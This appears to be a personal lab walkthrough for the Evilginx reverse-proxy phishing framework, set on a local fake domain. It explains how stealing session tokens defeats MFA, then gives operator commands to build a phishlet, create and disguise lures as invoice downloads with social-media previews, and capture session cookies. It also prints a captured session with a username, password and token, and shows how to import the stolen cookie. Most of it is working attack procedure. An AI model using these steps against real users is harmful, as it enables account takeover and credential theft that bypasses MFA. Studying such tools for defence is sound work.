**MFA and Web Security**
If the adversary learns your password the adversary will not know how to obtain the MFA token. This is game over for except in the case of how web works.
The session token needs to be stored in your web browser and will be embedded in every request.
The adversary can steal your web token and provide it to the web server.
The adversary can steal your token using reverse proxy simulation software such as evilginx.

**Stealing the token**
Cookies & local storage are ways to store session tokens. Evilginx can handle both.
Reverse proxy phishing is a one-to-one copy of the real website, proxied dynamically in real time from the real website server.
Phishing server is the middle-man server and will proxy outbound and inbound requests from victim and intended website.
The encrypted connection is made from the user to the phishing server and the phishing server can subsequently decrypt and analyze all traffic from the user.
if the user has mfa enabled on the account, they will be presented with a legitimate MFA challenge & the user will be asked for an MFA token.
EvilGinx will capture the session token once the victim signs into the website & the adversary will have access to the hijacked account.

**Preparing the Environment**
1) Create a new profile user in chrome, comes in handy when we create our own phishlets and we want to delete our cookies for testing. Will be doing it often.
2) setup extensions, edit this cookie, localStorageManager. setting up settings -> privacy bookmark.

**Intro** 
help info
help.evilginx.com

go to the webpage you're trying to create a phishlet for
open source inspector -> go to network tab -> click preserve log to ensure we can capture all of our requests.
login to the website.
create yaml phishlet using example as template in the evilginx folder visual studio code can be used or any ide.
Best practice to leave the TLD in the domain parameter, but use the subdomain in the phish_sub & orig_sub parameter.

setup phishlets and server configuration in evilginx
```
config domain fake.com
```

```
config ipv4 127.0.0.1
```

```
phishlets hostname akira lab.evilginx.fake.com
```

```
phishlets enable akira
```

setup hostsfile to point to our webserver.
```
phishlets get-hosts akira
```
127.0.0.1 akira.lab.evilginx.fake.com

create a lure 
```
lures create akira
```

obtain lure url
```
lures get-url 0
```
https://akira.lab.evilginx.fake.com/IRMzRHCK

session cookies will automatically be ignored by evilginx. You need to explicitly modify your phishlet file to have it capture session cookies. (cookies that do not expire and have the session keyword) put the 'always' keyword after the cookie you want to grab if it's ignored i.e:
```
'token:always'
```

Then when you steal the session cookie, you will use the edit-cookie import feature and copy / paste the cookie string from the session listing in evil ginx. Then browse to the intended web application.
```
sessions 4
```

```
 id           : 4
 phishlet     : akira
 username     : brendan@crownehill.com
 password     : 9VC30o82pdSH764M
 tokens       : captured
 landing url  : https://akira.lab.evilginx.fake.com/IRMzRHCK
 user-agent   : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
 remote ip    : 127.0.0.1
 create time  : 2024-05-30 10:58
 update time  : 2024-05-30 10:59

[ cookies ]
[{"path":"/","domain":"akira.lab.evilginx.com","expirationDate":1748627972,"value":"e0d2e227-517b-4cb6-ac3f-e491d2e87ab7","name":"token","httpOnly":true,"hostOnly":true}]
```

editing lures:
```
lures edit 0 path /download/invoice/00556/
```
```
lures edit 0 hostname this.is.a.real.website.fake.com
```
```
lures edit  0 redirect_url https://www.dropbox.com/files/username/invoice1.pdf
```
editing the open graph preview image / title for if you want to send your URL through social media apps such as discord, linkedIn, Facebook, etc.
```
lures edit 0 og_image 'https://imgur.com/123123'
```
```
og_title = 'Invoice #0045'
```

Can add custom parameters to lure url in order to prefill some data about the phished user.
```
lures get-url 0 email=brendan@crownehill.com name="Brendan Ortiz"
```
